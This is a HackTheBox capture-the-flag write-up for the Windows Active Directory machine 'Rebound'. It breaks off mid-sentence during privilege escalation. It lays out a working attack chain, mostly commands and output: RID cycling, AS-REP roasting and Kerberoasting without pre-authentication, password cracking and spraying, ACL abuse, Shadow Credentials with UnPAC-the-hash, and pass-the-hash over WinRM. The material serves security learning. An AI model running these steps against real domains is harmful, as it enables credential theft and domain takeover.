---
title: "HackTheBox - Rebound"
layout: "post"
categories: "Windows"
tags: ["HackTheBox", "Writeup", "Active Directory", "Shadow Credentials", "UnPAC the hash", "RBCD", "KCD", "RID Cycling"]
---

Rebound is a Windows machine, with the AD DS role installed, from the HackTheBox platform noted Insane released on September 09, 2023. It covers multiple techniques on Kerberos and especially a new Kerberoasting technique discovered in September 2022. It also covers ACL missconfiguration, the OU inheritance principle, SeImpersonatePrivilege exploitation and Kerberos delegations. ☺️

## Port Scanning

Firstly, let's do an nmap scan of the TCP ports:

```bash
❯ nmap -sCV 10.10.11.231 -Pn --open -T5 -oN nmap
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-10 17:32 CEST
Nmap scan report for 10.10.11.231
Host is up (0.023s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-09-10 22:32:47Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
|_ssl-date: 2023-09-10T22:33:37+00:00; +7h00m01s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-09-10T22:33:38+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-09-10T22:33:38+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-09-10T22:33:38+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2023-09-10T22:33:30
|_  start_date: N/A
```

We can add the DC's FQDN and NetBIOS name to our `/etc/hosts` configuration file:

```bash
❯ echo '10.10.11.231    rebound.htb     dc01.rebound.htb	DC01' | sudo tee -a /etc/hosts
```

## SMB Anonymous Login

We can see that access with the anonymous user on the SMB server is enabled:

```bash
❯ cme smb rebound.htb -u 'anonymous' -p '' --shares
SMB         rebound.htb     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         rebound.htb     445    DC01             [+] rebound.htb\anonymous:
SMB         rebound.htb     445    DC01             [+] Enumerated shares
SMB         rebound.htb     445    DC01             Share           Permissions     Remark
SMB         rebound.htb     445    DC01             -----           -----------     ------
SMB         rebound.htb     445    DC01             ADMIN$                          Remote Admin
SMB         rebound.htb     445    DC01             C$                              Default share
SMB         rebound.htb     445    DC01             IPC$            READ            Remote IPC
SMB         rebound.htb     445    DC01             NETLOGON                        Logon server share
SMB         rebound.htb     445    DC01             Shared          READ
SMB         rebound.htb     445    DC01             SYSVOL                          Logon server share
```

Moreover, there is a uncommon share that is readable however he is useless, i.e. no data in this share, no URL File attack working, etc...

## RID Cycling

With [lookupsid.py](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py) tool from impacket suite, we can perform RID Cycling up to the maximum RID number of 20000:

```bash
❯ lookupsid.py "REBOUND"/Guest@"rebound.htb" 20000 -no-pass
Impacket v0.10.1.dev1+20221126.211256.6b9a5269 - Copyright 2022 SecureAuth Corporation

[*] Brute forcing SIDs at rebound.htb
[*] StringBinding ncacn_np:rebound.htb[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209
498: rebound\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: rebound\Administrator (SidTypeUser)
501: rebound\Guest (SidTypeUser)
502: rebound\krbtgt (SidTypeUser)
512: rebound\Domain Admins (SidTypeGroup)
513: rebound\Domain Users (SidTypeGroup)
514: rebound\Domain Guests (SidTypeGroup)
515: rebound\Domain Computers (SidTypeGroup)
516: rebound\Domain Controllers (SidTypeGroup)
517: rebound\Cert Publishers (SidTypeAlias)
518: rebound\Schema Admins (SidTypeGroup)
519: rebound\Enterprise Admins (SidTypeGroup)
520: rebound\Group Policy Creator Owners (SidTypeGroup)
521: rebound\Read-only Domain Controllers (SidTypeGroup)
522: rebound\Cloneable Domain Controllers (SidTypeGroup)
525: rebound\Protected Users (SidTypeGroup)
526: rebound\Key Admins (SidTypeGroup)
527: rebound\Enterprise Key Admins (SidTypeGroup)
553: rebound\RAS and IAS Servers (SidTypeAlias)
571: rebound\Allowed RODC Password Replication Group (SidTypeAlias)
572: rebound\Denied RODC Password Replication Group (SidTypeAlias)
1000: rebound\DC01$ (SidTypeUser)
1101: rebound\DnsAdmins (SidTypeAlias)
1102: rebound\DnsUpdateProxy (SidTypeGroup)
1951: rebound\ppaul (SidTypeUser)
2952: rebound\llune (SidTypeUser)
3382: rebound\fflock (SidTypeUser)
5277: rebound\jjones (SidTypeUser)
5569: rebound\mmalone (SidTypeUser)
5680: rebound\nnoon (SidTypeUser)
7681: rebound\ldap_monitor (SidTypeUser)
7682: rebound\oorend (SidTypeUser)
7683: rebound\ServiceMgmt (SidTypeGroup)
7684: rebound\winrm_svc (SidTypeUser)
7685: rebound\batch_runner (SidTypeUser)
7686: rebound\tbrady (SidTypeUser)
7687: rebound\delegator$ (SidTypeUser)
```

> RID Cycling is an attack that attempts to enumerate accounts in Active Directory environment by fuzz the RIDs

RID is part of a security identifier (SID) that identifies a user or group to the authority that issued the SID.

Here you can find the composition of a [SID](https://learn.microsoft.com/fr-fr/windows/win32/secauthz/security-identifiers):

![sid_schema](/assets/posts/2023-09-19-htb-rebound/sid_schema.gif)

To test attacks with these usernames, we can parse them with a bash command:

```bash
❯ cat users.out | grep SidTypeUser | grep -v -e '\$' -e '{' -e '}' -e HealthMailbox | awk -F'\' '{print $2}' | awk '{print $1}' | perl -nle 'print if m{^[[:ascii:]]+$}' > users.lst
```

## AS-REP Roasting

There is an account named jjones that is AS-REP Roastable. An AS-REP Roastable user is one for whom Kerberos pre-authentication is not required (`DONT_REQUIRE_PREAUTH` flag in `userAccountControl` LDAP attribute). We can then request a TGT (Ticket Granting Ticket) from the KDC (Key Distribution Center) in the user's name and crack part of the `KRB_AS_REP` response, which contains the TGT and a session key encrypted with its NT hash. An attacker can attempt to retrieve the password for this domain account via bruteforce offline.

```bash
❯ GetNPUsers.py -usersfile users.lst -request -format hashcat -dc-ip dc01.rebound.htb 'rebound.htb/'
Impacket v0.10.1.dev1+20221126.211256.6b9a5269 - Copyright 2022 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User ppaul doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User llune doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User fflock doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$jjones@REBOUND.HTB:94cd681508c24a71db730ba18aae1540$245f2b285c9804f68f8eaa7ebd50fa465601107ac1157c8fa90d99bce5ce6192e3876d4f391768f2b17d67376d09b8c43117d6545ffaceceaa9397a6f9592d2a884da35bcae3337bce01b89da6b01ee92af11133b8e88fbd7afb099a10cf1c164ec8eab86b942eaca5b331a4d63772eeb66ee8f906a08b3f723a9ae58a64a53a0de8757d24fcfe5dbcb3f0e34f87f5ac732a96103321b63019571fdeb456a9dd621752d077c57e6fcce77eb07302d74806d4cc9a779163ebf90a50a77e1eaf04af0efabdd29db972f2f67557cdf0e26b8b9a130d5267c1f9b4f89a568ee0ae40bc1d6683921298099fc3
[-] User mmalone doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nnoon doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ldap_monitor doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User oorend doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User winrm_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User batch_runner doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tbrady doesn't have UF_DONT_REQUIRE_PREAUTH set
```

However, the KRB5ASREP encryption type 23 hash isn't crackable.

## Kerberoasting w/o pre-authentication

In September 2022 a vulnerability was discovered, ST (Service Tickets) can be obtained through `KRB_AS_REQ` request without having to control any Active Directory account.

With Kerberoasting attack, an attacker can request a TGT (Ticket Granting Ticket) from the KDC, (Key Distribution Center) via a `KRB_AS_REQ` request, the KDC will then send a TGT in the name of the requesting user and a session key encrypted with the user's NT hash, via a `KRB_AS_REP` response.
Next, the user can request an ST (Service Ticket) from the TGS (Ticket Granting Service) by providing his TGT and a valid SPN (Service Principal Name), via a `KRB_TGS_REQ` request. The KDC will then send him an ST for the requested service via a `KRB_TGS_REP` response.
This ST is encrypted with the NT hash of the requested service account. This account is then said to be Kerberoastable. An attacker can attempt to retrieve the service account password via bruteforce offline.

So we can Kerberoast some users with the parameter `-no-preauth` (commited in one [Shutdown's PR](https://github.com/fortra/impacket/pull/1413) that takes AS_REP Roastable user in argument:

```bash
❯ GetUserSPNs.py -no-preauth "jjones" -usersfile "users.lst" -dc-host "dc01.rebound.htb" "rebound.htb"/
Impacket v0.10.1.dev1+20221126.211256.6b9a5269 - Copyright 2022 SecureAuth Corporation

[-] Principal: Administrator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Guest - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$18$krbtgt$REBOUND.HTB$*krbtgt*$391a2b6989d3486c4c1e58a8$63737205aa8b522e383f8e369fd07226aba2bcefec7a74ab23a778087f3dcb9013843a09275a65b287acffe85823663fc6b5bc08100cec7dcdd8f857503dcf26c06c950136d1098d4f7fef1e10b262d8efc7cb3c62fe06ee1c5de786b13c57c8be2dcaea62f3d8d30ac2c2c9fc9c8b21d6b36c05330aa08d72a5c1eff46756a5ad7df815f59a6334f3b16a253c60e1df313c3cd0651c5d164c02566ea7d428da3dd4ebc66f2f1cbaa6c6ddc4d7f6bc96dab4ac108c8cdf3438524a4d3e1e99992b4a92edeeeaf9c91124074f1c58726a5a747095d48c1eb1df9cc5d49c34afd7bf9fb92b22f108ecc1918876cb07a1552c87197ddf9b8c332c119a4eaf0ddc0c0a02c17503a3adb88646a03a231e2eb10a43f8816f41d2bc5199a711c258a68f581f19c2c6309836419219fb58f27c3f6278007629230d245e850af9d798e29e91858642d905ead61cc51369bcfdd30c5f8260894f68bb04e6891e1a13f1d814ef6eba062abfd365c24dc630e4cec2e2067c4d0d960b7c0e7dcabe65bdc4af15fc183e101e42d949851ca6c2947c86ce11024931486d473bbd62d5e0536a84e4e399c8d357a62d05d3c7e73106708255fca6f3862afe4a9f9755820993d01836ad6a1025243dc81b5eb4632a547e5363752106e64d6691da5edaa27c16083d9058586b006ba25b7bc212e5fbdb72da3aa0b4d68bba266dd0e9f8b5bc2c5d8d5229b320d5e5f61f9d43d7b6fa435420f9ce409d17e1c85f6950e7d2bec7e4b79b99a1681f407d3a26b0ac8922794240bbcf73d0ae552c21c4775                                         47d8b97c268fc4d6c804a2897c721f040a0d2fa1c095bf7eabac120569377f022655c8dd0913722fa16607b79d08d1b745173c77426bd6b54992b65e1945caefa87507947c83a0cfceef5828dca65c94a7e2dd0e236411e6854e6721c94857039402bdffba2da227b6434ac0ee80d087e20d8adc36441c50961547155ec70fae47196c676e1fab909f8baf2f1b672482abdecf4b94dbbd5bd4c22c4a9bb4bd4f2b0b3f89ad8850a410a6416e0ada91ecda3d266dfde2abd79d2e3dd10ac70a388b69e503c11eb26fcf2ea1385ef28aa84e5f5a7954e0bb02cd6759c1b65c0a406da2d0571e3a35e976b31d6270b3499b06d525bfb6a0d886bf04033cf02d31879913d77a41b1d7dce5bde5c15d1a20a16c9bba32d60ced9e69e5dfdd146400379b4e624bdfba90d3d2783386f85b36aa5b81a1b856c0e4e4605882acacb991d337b019c4c8fb4a4a4508b103b00d2aa874f39246769c91b89dadb5d0bdf951599293ab46e65f6870acad1eeb24d03a73ff25ac89dd4c4efc149527a4e38c3c566adb602d982fa9131e92a62b023878db486c52834dcb44c25015a18db5f9d362f0806e64312decdfb086eb0dd14303513541f6df9ad61cef922eb13e8783c15860d412c150482176ac9f8579b29162f570b02b6d041095794
[-] Principal: ppaul - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: llune - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: fflock - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: jjones - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: mmalone - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: nnoon - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$36f482818d15b6e6bc19e376201f9a17$13699dc57bfb2d383d9a256691f50851d196f5b8f0721dc68f2be0a033c0d530d2d0da9381a67f8bb6c826f72c61b8423f4e659dedd1bfa335c3628da4d83e9713c6c7ab789524716724773e5edbad8e7c6f58dcfad590661fad7ccb4b40bc0ef3c59612e89b767048166e3f152d32a2adcc74a39518ca5bc888fe3805b68cd2f36501e73d39a97a2e07cd1301146434d93466b1ab601189e7650f80b6e8ef427064e37a0f270dd27436b118c1e00fc9459fb9e4a0940f01b506a7717a6764ea94afc15e389e046b1676db8df3cc237b1dd48ccf32e827f76b03f88828e97c5e93599086ea68c142bb7b7f09587440d1500b85180f9e3aaeb3c73c4d36f34009d837319bf2bbc82f649233dd1adf612a6bf78ffd6b24d3c738490158965cbf104bbfcac10253fe24a444b23cd1f782c88e0012cd71b3ecf5c1e352f5440ff2bb293d1e51aca26bac2d55d75a7dc138cc1110c4338164bde51fecf3d815280070630c515c127e5780d7971c237465005c4ce7d67b9e9cdb22ebb4765bf78e5c2da84d3ae6fdcc25e1315c2ca26a7f8a5d531d981acb5b9ed2328fb23233a7ddfbed7e8775840c5f754df6cb60cc85c508ef74838ff551f1e437018aa9b7667f6b7d68f69ed0a61ba29f34bfee8554d41f2115967a80b38a8ab38256af8a1760b380227edf2053329169feea13e95f41aeb2d50885938cf0e25b48db0841809cfa94005d79dd1b0ef964fb71d712ade5fc7ddd22bfe0fd92dec564f01149360285d6eaeec775089dbde812f259fedce6ca89c33b6cb3618e17167585e4b58818f0042a7aefb3e109c8fffdeb84068354521f3794b5f9e355197c37c8d1881f2bb57b980729cb554535a5b0ba017734b3f6606374506899c0c7059b3bc4d35583699305e3d67d0dd7fcbb568992ef02bdcee4c2393b7d19fc95efce621e9b472e15dc0a9216c57c49bfe06239f7f376948c8d16294fa96c5cc69e73cccca4ed146056836a74503ce1d18e42ef6bb119a98130e2c73067ac7a757eb9f54c9907bccb5c1401d87fec6207e0931b1f2984a2c3cf48f236b44944ea07850ef8caded207de4fcecb8f768f18f25c0d8e7f2fdb71075f6b81a27557f3e87bf745f4fbc86c4dfb9e7ec5eec45e7248dac1839f14682bb6f9575135cfb20e3812947d74d10e9fb44293a4df931dea6859267a96478d4a90b06e6d1697c4a030f88aa2ad0828a71ced312ae2cf07affb495332bc9f333a32b1a138344af5f0fd5731e37902d5bdaa45ef02fdef50ef14b59e3b96460c9bc83519633d820590d7f507e7ec0d6cabd0a6ae543cdbe98996df69dc5051899a20817ecd2465a8ab33b0c68b2c0c6bb1c9
[-] Principal: oorend - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: winrm_svc - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: batch_runner - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: tbrady - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
```

One KRB5TGSREP etype 23 hash is crackable:

```bash
❯ john ldap_monitor.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
1GR8t@$$4u       (?)
1g 0:00:00:02 DONE (2023-09-10 18:17) 0.4464g/s 5822Kp/s 5822Kc/s 5822KC/s 1LuvMum..1BLAYDE
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

## Password Spraying

Now we have ldap_monitor's credentials (`ldap_monitor:1GR8t@$$4u`), we can spray this password with the others users:

```bash
❯ cme smb rebound.htb -u users.lst -p '1GR8t@$$4u' -d rebound.htb --continue-on-success
SMB         rebound.htb     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         rebound.htb     445    DC01             [-] rebound.htb\Administrator:1GR8t@$$4u STATUS_LOGON_FAILURE
SMB         rebound.htb     445    DC01             [-] rebound.htb\Guest:1GR8t@$$4u STATUS_LOGON_FAILURE
SMB         rebound.htb     445    DC01             [-] rebound.htb\krbtgt:1GR8t@$$4u STATUS_LOGON_FAILURE
SMB         rebound.htb     445    DC01             [-] rebound.htb\ppaul:1GR8t@$$4u STATUS_LOGON_FAILURE
SMB         rebound.htb     445    DC01             [-] rebound.htb\llune:1GR8t@$$4u STATUS_LOGON_FAILURE
SMB         rebound.htb     445    DC01             [-] rebound.htb\fflock:1GR8t@$$4u STATUS_LOGON_FAILURE
SMB         rebound.htb     445    DC01             [-] rebound.htb\jjones:1GR8t@$$4u STATUS_LOGON_FAILURE
SMB         rebound.htb     445    DC01             [-] rebound.htb\mmalone:1GR8t@$$4u STATUS_LOGON_FAILURE
SMB         rebound.htb     445    DC01             [-] rebound.htb\nnoon:1GR8t@$$4u STATUS_LOGON_FAILURE
SMB         rebound.htb     445    DC01             [+] rebound.htb\ldap_monitor:1GR8t@$$4u
SMB         rebound.htb     445    DC01             [+] rebound.htb\oorend:1GR8t@$$4u
SMB         rebound.htb     445    DC01             [-] rebound.htb\winrm_svc:1GR8t@$$4u STATUS_LOGON_FAILURE
SMB         rebound.htb     445    DC01             [-] rebound.htb\batch_runner:1GR8t@$$4u STATUS_LOGON_FAILURE
SMB         rebound.htb     445    DC01             [-] rebound.htb\tbrady:1GR8t@$$4u STATUS_LOGON_FAILURE
```

We get two user domain accounts : `ldap_monitor` and `oorend`.

## Bloodhound Enumeration / Minimal ACEs checking

Let's run ingestor/collector to do multiple LDAP queries and dump the directory:

```bash
❯ rusthound -d rebound.htb -u 'oorend@rebound' -p '1GR8t@$$4u' -i 10.10.11.231 --zip --ldaps
---------------------------------------------------
Initializing RustHound at 19:31:51 on 09/10/23
Powered by g0h4n from OpenCyber
---------------------------------------------------

[2023-09-10T17:31:51Z INFO  rusthound] Verbosity level: Info
[2023-09-10T17:31:51Z INFO  rusthound::ldap] Connected to REBOUND.HTB Active Directory!
[2023-09-10T17:31:51Z INFO  rusthound::ldap] Starting data collection...
[2023-09-10T17:31:52Z INFO  rusthound::ldap] All data collected for NamingContext DC=rebound,DC=htb
[2023-09-10T17:31:52Z INFO  rusthound::json::parser] Starting the LDAP objects parsing...
[2023-09-10T17:31:52Z INFO  rusthound::json::parser] Parsing LDAP objects finished!
[2023-09-10T17:31:52Z INFO  rusthound::json::checker] Starting checker to replace some values...
[2023-09-10T17:31:52Z INFO  rusthound::json::checker] Checking and replacing some values finished!
[2023-09-10T17:31:52Z INFO  rusthound::json::maker] 16 users parsed!
[2023-09-10T17:31:52Z INFO  rusthound::json::maker] 61 groups parsed!
[2023-09-10T17:31:52Z INFO  rusthound::json::maker] 1 computers parsed!
[2023-09-10T17:31:52Z INFO  rusthound::json::maker] 2 ous parsed!
[2023-09-10T17:31:52Z INFO  rusthound::json::maker] 1 domains parsed!
[2023-09-10T17:31:52Z INFO  rusthound::json::maker] 2 gpos parsed!
[2023-09-10T17:31:52Z INFO  rusthound::json::maker] 21 containers parsed!
[2023-09-10T17:31:52Z INFO  rusthound::json::maker] ./20230910193152_rebound-htb_rusthound.zip created!

RustHound Enumeration Completed at 19:31:52 on 09/10/23! Happy Graphing!
```

After a bloodhound enumeration, we realize the future compromise path, but not the new domain account to pwn.
Whether with the ingestor [RustHound](https://github.com/NH-RED-TEAM/RustHound) or [bloodhound-python](https://github.com/dirkjanm/BloodHound.py), none of them put us on the trail.

The aim is to be in ServiceMGMT group to get GenericAll (`ADS_RIGHT_GENERIC_ALL`) permission on Service Users OU, this means that we will have full control:

![bh_screen_servicemgmt](/assets/posts/2023-09-19-htb-rebound/bh_screen_servicemgmt.png)

Moreover, winrm_svc user is in Service Users OU, all that's missing is for OU inheritance to be activated to force change password of winrm_svc user.

One ACE has not been collected, though we can enumerate it with the [dacledit.py](https://github.com/fortra/impacket/pull/1291) tool.

Firstly, let's ask TGT to authenticate via Kerberos protocol because NTLM authentication is broken with LDAPS protocol in this environment:

```bash
❯ sudo ntpdate rebound.htb
21 Sep 05:44:37 ntpdate[116927]: step time server 10.10.11.231 offset +25203.661247 sec
❯ getTGT.py -dc-ip "dc01.rebound.htb" "rebound.htb"/'oorend':'1GR8t@$$4u'
Impacket for Exegol - v0.10.1.dev1+20230806.34223.faf17b2 - Copyright 2022 Fortra - forked by ThePorgs

[*] Saving ticket in oorend.ccache
❯ export KRB5CCNAME=oorend.ccache
```

It's important to synchronize your system with the same time as the DC, as a Kerberos ticket can only be used at intervals of up to 5 minutes, and of course using FQDNs.

We can see that oorend user account has [Self](https://learn.microsoft.com/en-us/windows/win32/api/iads/ne-iads-ads_rights_enum) (`ADS_RIGHT_DS_SELF`) access right on ServiceMGMT group, this right can perform Validated writes (i.e. edit an attribute's value and have that value verified and validate by AD). The Validated writes is referenced by an ObjectType GUID:

```bash
❯ dacledit.py -action read -target SERVICEMGMT -principal oorend -dc-ip 10.10.11.231 rebound.htb/'oorend':'1GR8t@$$4u' -use-ldaps -k
Impacket for Exegol - v0.10.1.dev1+20230806.34223.faf17b2 - Copyright 2022 Fortra - forked by ThePorgs

[*] Parsing DACL
[*] Printing parsed DACL
[*] Filtering results for SID (S-1-5-21-4078382237-1492182817-2568127209-7682)
[*]   ACE[2] info
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : None
[*]     Access mask               : Self (0x8)
[*]     Trustee (SID)             : oorend (S-1-5-21-4078382237-1492182817-2568127209-7682)
```

## Add oorend to ServiceMGMT group

So we can add the pwned user oorend in ServiceMGMT group with [bloodyAD](https://github.com/CravateRouge/bloodyAD) tool and ask again TGT to update the PAC (Privilege Attribute Certificate):

```bash
❯ python3 bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@$$4u' --host 10.10.11.231 add groupMember 'CN=SERVICEMGMT,CN=USERS,DC=REBOUND,DC=HTB' 'CN=oorend,CN=Users,DC=rebound,DC=htb'
[+] CN=oorend,CN=Users,DC=rebound,DC=htb added to CN=SERVICEMGMT,CN=USERS,DC=REBOUND,DC=HTB
❯ getTGT.py -dc-ip "dc01.rebound.htb" "rebound.htb"/'oorend':'1GR8t@$$4u'
Impacket for Exegol - v0.10.1.dev1+20230806.34223.faf17b2 - Copyright 2022 Fortra - forked by ThePorgs

[*] Saving ticket in oorend.ccache
```

The PAC (Privilege Attribute Certificate) is an extension of the Kerberos protocol used by Microsoft to manage rights in an Active Directory environment.
Only the KDC knows the rights of each AD object, so it is necessary to transmit this information to the various services (in the authorization-data field of Kerberos tickets) so that they can create access tokens adapted to the users using these services.
The PAC stores several pieces of information about the user, including name, ID, groups to which the user belongs, security information associated with the user, etc.
For more details, here's the PAC's [KERB_VALIDATION_INFO](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/69e86ccc-85e3-41b9-b514-7d969cd0ed73) structure:

```c
typedef struct _KERB_VALIDATION_INFO {
    FILETIME LogonTime;
    FILETIME LogoffTime;
    FILETIME KickOffTime;
    FILETIME PasswordLastSet;
    FILETIME PasswordCanChange;
    FILETIME PasswordMustChange;
    RPC_UNICODE_STRING EffectiveName;
    RPC_UNICODE_STRING FullName;
    RPC_UNICODE_STRING LogonScript;
    RPC_UNICODE_STRING ProfilePath;
    RPC_UNICODE_STRING HomeDirectory;
    RPC_UNICODE_STRING HomeDirectoryDrive;
    USHORT LogonCount;
    USHORT BadPasswordCount;
    ULONG UserId;
    ULONG PrimaryGroupId;
    ULONG GroupCount;
    [size_is(GroupCount)] PGROUP_MEMBERSHIP GroupIds;
    ULONG UserFlags;
    USER_SESSION_KEY UserSessionKey;
    RPC_UNICODE_STRING LogonServer;
    RPC_UNICODE_STRING LogonDomainName;
    PISID LogonDomainId;
    ULONG Reserved1[2];
    ULONG UserAccountControl;
    ULONG SubAuthStatus;
    FILETIME LastSuccessfulILogon;
    FILETIME LastFailedILogon;
    ULONG FailedILogonCount;
    ULONG Reserved3;
    ULONG SidCount;
    [size_is(SidCount)] PKERB_SID_AND_ATTRIBUTES ExtraSids;
    PISID ResourceGroupDomainSid;
    ULONG ResourceGroupCount;
    [size_is(ResourceGroupCount)] PGROUP_MEMBERSHIP ResourceGroupIds;
} KERB_VALIDATION_INFO;
```

## Enable Full Controll right with inheritance in Service Users OU

Now let's give Full Control right at oorend user with the inheritance enabled on the Service Users OU (Organization Unit):

```bash
❯ dacledit.py -action write -rights 'FullControl' -principal 'oorend' -target-dn'OU=SERVICE USERS,DC=REBOUND,DC=HTB' -inheritance 'rebound.htb'/'oorend:1GR8t@$$4u' -k -use-ldaps -dc-ip dc01.rebound.htb
Impacket for Exegol - v0.10.1.dev1+20230806.34223.faf17b2 - Copyright 2022 Fortra - forked by ThePorgs

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20230921-075341.bak
```

This causes us to have full rights to the user winrm_svc as oorend.

## Shadow Credentials / UnPAC the hash

Instead of changing the password of the user winrm_svc, we can perform a Shadow Credentials attack, which consists in edit the target object's `msDs-KeyCredentialLink` LDAP attribute with [KeyCredential structure](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/de61eb56-b75f-4743-b8af-e9be154b47af) that contains our RSA public key. From here we can authenticate using PKINIT, our certificate and our private key. Moreover using PKINIT, the TGT contains [PAC_CREDENTIAL_INFO](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/cc919d0c-f2eb-4f21-b487-080c486d85fe) structure that can be decrypted with S4U2self + U2U technique and with Session Key, this attack is named UnPAC the hash:

![unpacthehash_schema](/assets/posts/2023-09-19-htb-rebound/unpacthehash_schema.webp)

```bash
❯ certipy shadow auto -account winrm_svc -u "oorend@rebound.htb" -p '1GR8t@$$4u' -dc-ip 10.10.11.231 -k -target dc01.rebound.htb
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '7893c230-503d-4e5f-4113-aa6ce934eeaf'
[*] Adding Key Credential with device ID '7893c230-503d-4e5f-4113-aa6ce934eeaf' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID '7893c230-503d-4e5f-4113-aa6ce934eeaf' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Using principal: winrm_svc@rebound.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 4469650fd892e98933b4536d2e86e512
```

We now have the hash of user winrm_svc, so we don't have to change his password every 5 minutes, as the environment causes his password to be reset by default.
winrm_svc have `CanPSRemote` relationship:

```bash
❯ evil-winrm -u "winrm_svc" -H '4469650fd892e98933b4536d2e86e512' -i "dc01.rebound.htb"
```

## Privilege escalation: RemotePotato

Remote Potato is a exploit of Potato family (no need `SeImpersonatePrivilege`) that abuse DCOM activation service by unmarshalling an IStorage object, calling
